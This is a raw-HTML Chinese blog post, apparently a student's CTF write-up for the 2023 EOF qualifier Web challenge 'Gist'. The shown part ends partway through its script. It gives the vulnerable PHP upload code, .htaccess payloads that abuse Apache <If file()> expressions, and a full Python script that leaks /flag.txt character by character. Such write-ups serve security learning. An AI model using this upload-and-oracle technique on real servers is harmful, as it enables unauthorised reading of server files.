href=#hex>HEX</a></li><li><a href=#lf3r>LF3R</a></li><li><a href=#popcnt>popcnt</a></li><li><a href=#el2dlog>el2dlog</a></li></ul></li></ul></nav></div></span></div><article class=post itemscope itemtype=http://schema.org/BlogPosting><header><h1 class=posttitle itemprop="name headline">2023 EOF quals</h1><div class=meta><span class=author itemprop=author itemscope itemtype=http://schema.org/Person><span itemprop=name>2qbingxuan&nbsp;</span></span><div class=postdate><time datetime="2023-01-13 00:34:19 +0800 +0800" itemprop=datePublished>2023-01-13</time></div><div class=article-tag><i class="fas fa-tag"></i>
<a class=tag-link href=/tags/CTF/ rel=tag>CTF</a>
,
<a class=tag-link href=/tags/math/ rel=tag>math</a></div></div></header><div class=content itemprop=articleBody><h1 id=2023-eof-ctf-初賽>2023 EOF CTF 初賽</h1><p>修了計算機安全，然後期末考似乎是參加 EOF CTF 的初賽，另外還要交 writeup。<br>把我寫的部份放在我的 blog 上水文章（？）<br>下一篇文章希望是大二上的修課心得，再不寫就要忘光了。</p><h2 id=web>Web</h2><h3 id=gist>Gist</h3><h4 id=problem>problem</h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_FILES[<span style=color:#e6db74>&#39;file&#39;</span>])){
</span></span><span style=display:flex><span>    $file <span style=color:#f92672>=</span> $_FILES[<span style=color:#e6db74>&#39;file&#39;</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>( <span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/ph/i&#39;</span>, $file[<span style=color:#e6db74>&#39;name&#39;</span>]) <span style=color:#f92672>!==</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>     <span style=color:#f92672>||</span> <span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/ph/i&#39;</span>, <span style=color:#a6e22e>file_get_contents</span>($file[<span style=color:#e6db74>&#39;tmp_name&#39;</span>])) <span style=color:#f92672>!==</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>     <span style=color:#f92672>||</span> $file[<span style=color:#e6db74>&#39;size&#39;</span>] <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0x100</span>
</span></span><span style=display:flex><span>    ){ <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Bad file!&#34;</span>); }
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    $uploadpath <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;upload/&#39;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>md5_file</span>($file[<span style=color:#e6db74>&#39;tmp_name&#39;</span>])<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;/&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>@</span><span style=color:#a6e22e>mkdir</span>($uploadpath);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>move_uploaded_file</span>($file[<span style=color:#e6db74>&#39;tmp_name&#39;</span>], $uploadpath<span style=color:#f92672>.</span>$file[<span style=color:#e6db74>&#39;name&#39;</span>]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>Header</span>(<span style=color:#e6db74>&#34;Location: &#34;</span><span style=color:#f92672>.</span>$uploadpath<span style=color:#f92672>.</span>$file[<span style=color:#e6db74>&#39;name&#39;</span>]);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Upload success!&#34;</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;form method=POST enctype=multipart/form-data&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>  &lt;input type=file name=file&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>  &lt;input type=submit value=Upload&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/form&gt;
</span></span></span></code></pre></td></tr></table></div></div><p>題目是有一個簡單的 php 網站可以上傳任意檔案，只要檔名和內容不包含 <code>ph</code> 就可以上傳，會被放到 <code>/var/www/html/upload/{somerandomstring}/</code> 裡面（可以用 <code>/upload/{somerandomstring}/</code> 去 access 該資料夾）。<br>首先第一步就是看背後的 HTTP 伺服器是誰，隨便戳個 404 可以得知是 Apache，那就聯想到 <code>.htaccess</code>，去 google 之後得知可以用 <code>&lt;If file(xxx)></code> 來得知檔案內容。<br><a href=https://blog.csdn.net/solitudi/article/details/116666720>https://blog.csdn.net/solitudi/article/details/116666720</a></p><p>我一開始用的 payload 是</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-apache data-lang=apache><span style=display:flex><span><span style=color:#f92672>&lt;If</span> <span style=color:#e6db74>&#34;file(&#39;/flag.txt&#39;) &lt; &#39;flag{ABCD&#39;&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>ErrorDocument <span style=color:#ae81ff>404</span> <span style=color:#e6db74>&#34;leq&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/If&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>不過因為 escape char 的問題只偷得到部份的 flag，把單引號跟雙引號都 escape 掉之後還是有一部分偷不到，不知道怎麼解決，最後是翻到有一個 base64 function 就把 payload 改成</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-apache data-lang=apache><span style=display:flex><span><span style=color:#f92672>&lt;If</span> <span style=color:#e6db74>&#34;base64(file(&#39;/flag.txt&#39;)) &lt; &#39;RkxBR3tXa&#39;&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>ErrorDocument <span style=color:#ae81ff>404</span> <span style=color:#e6db74>&#34;leq&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/If&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>最後的 script:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> bs4 <span style=color:#f92672>import</span> BeautifulSoup
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> tqdm <span style=color:#f92672>import</span> tqdm
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> base64 <span style=color:#f92672>import</span> b64decode
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># https://httpd.apache.org/docs/2.4/expr.html</span>
</span></span><span style=display:flex><span><span style=color:#75715e># https://stackoverflow.com/questions/22567306/how-to-upload-file-with-python-requests</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;https://gist.ctf.zoolab.org/&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>upload</span>(payload):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;.htaccess&#39;</span>, <span style=color:#e6db74>&#39;wb&#39;</span>) <span style=color:#66d9ef>as</span> file:
</span></span><span style=display:flex><span>        file<span style=color:#f92672>.</span>write(payload<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;.htaccess&#39;</span>, <span style=color:#e6db74>&#39;rb&#39;</span>) <span style=color:#66d9ef>as</span> file:
</span></span><span style=display:flex><span>        res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url, files<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#39;file&#39;</span>: file})
</span></span><span style=display:flex><span>        <span style=color:#75715e># soup = BeautifulSoup(res.text, feature=&#34;lxml&#34;)</span>
</span></span><span style=display:flex><span>        path <span style=color:#f92672>=</span> res<span style=color:#f92672>.</span>url
</span></span><span style=display:flex><span>        path <span style=color:#f92672>=</span> path[:path<span style=color:#f92672>.</span>rfind(<span style=color:#e6db74>&#39;/&#39;</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> path
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># &lt;If &#34;file(&#39;/flag.txt&#39;) =~ m#flag{a#i&#34;&gt;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>ask_leq</span>(s):
</span></span><span style=display:flex><span>    s <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>    s <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\\\&#39;</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>    s <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>    s <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;&#34;&#39;</span>, <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#75715e># print(s)</span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;&#39;&#39;&lt;If &#34;base64(file(&#39;/flag.txt&#39;)) &lt; &#39;</span><span style=color:#e6db74>{</span>s<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    ErrorDocument 404 &#34;leq </span><span style=color:#e6db74>{</span>s[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;/If&gt;&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    path <span style=color:#f92672>=</span> upload(payload)
</span></span><span style=display:flex><span>    res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(path <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;something404&#39;</span>)
</span></span><span style=display:flex><span>    leq <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;leq&#39;</span> <span style=color:#f92672>in</span> res<span style=color:#f92672>.</span>text
</span></span><span style=display:flex><span>    <span style=color:#75715e># assert &#39;500 Internal Server Error&#39; not in res.text</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> leq
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>ask_size_leq</span>(n):
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;&#39;&#39;&lt;If &#34;filesize(&#39;/flag.txt&#39;) -le </span><span style=color:#e6db74>{</span>n<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    ErrorDocument 404 &#34;leq </span><span style=color:#e6db74>{</span>n<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;/If&gt;&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    path <span style=color:#f92672>=</span> upload(payload)
</span></span><span style=display:flex><span>    res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(path <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;something404&#39;</span>)
</span></span><span style=display:flex><span>    leq <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;leq&#39;</span> <span style=color:#f92672>in</span> res<span style=color:#f92672>.</span>text
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span> <span style=color:#e6db74>&#39;500 Internal Server Error&#39;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> res<span style=color:#f92672>.</span>text
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> leq
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># prefix = &#39;FLAG{Wh4t_1f_th3_WAF_b3c0m3_preg_match(&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># prefix = &#39;&#39;&#39;FLAG{Wh4t_1f_th3_WAF_b3c0m3_preg_match(&#39;/h/i&#39;,file_get_contents&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># prefix = &#39;&#39;&#39;FLAG{Wh4t_1f_th3_WAF_b3c0m3_preg_match(&#39;/h/i&#39;,file_get_contents($file[&#39;tmp_name&#39;])&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># print(len(prefix))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>prefix <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># prefix = &#39;RkxBR3tXaDR0XzFmX3RoM19XQUZfYjNjMG0zX3ByZWdfbWF0Y2goJy9oL2knLGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlWyd0bXBfbmFtZSddKSkhPT0w&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>89</span> <span style=color:#f92672>//</span> <span style=color:#ae81ff>3</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>4</span>):
</span></span><span style=display:flex><span>    L <span style=color:#f92672>=</span> <span style=color:#ae81ff>32</span>
</span></span><span style=display:flex><span>    R <span style=color:#f92672>=</span> <span style=color:#ae81ff>127</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> R <span style=color:#f92672>-</span> L <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>        M <span style=color:#f92672>=</span> (R <span style=color:#f92672>+</span> L) <span style=color:#f92672>//</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ask_leq(prefix <span style=color:#f92672>+</span> chr(M)):
</span></span><span style=display:flex><span>            R <span style=color:#f92672>=</span> M
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            L <span style=color:#f92672>=</span> M
</span></span><span style=display:flex><span>    prefix <span style=color:#f92672>+=</span> chr(L)
</span></span><span style=display:flex><span>    print(L, prefix)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> len(prefix) <span style=color:#f92672>%</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>        print(b64decode(prefix<span style=color:#f92672>.</span>encode()))
